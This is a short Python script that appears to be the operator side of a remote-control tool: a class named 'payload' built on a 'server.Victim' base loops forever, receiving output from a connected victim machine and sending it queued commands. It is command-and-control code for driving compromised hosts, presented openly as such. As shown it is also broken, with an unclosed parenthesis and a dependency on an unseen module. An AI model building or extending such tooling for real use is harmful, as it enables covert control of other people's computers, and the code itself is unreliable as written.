#!/usr/bin/env python3
import server; 
import string;
import sys

class payload(server.Victim):
    def run(self):
        while(True):
            encoded = self.secure_recv()
            print(encoded.decode('utf-8')
          #  print("".join(filter(lambda x: x in string.printable, str(self.secure_recv(),'ascii'))),end="")
            Command = str(self.getCommandFromQueue())
            print(Command)
            self.secure_send(Command.encode("utf8"),len(Command.encode("utf8")))
            
if __name__ == "__main__":
    server.run(payload)


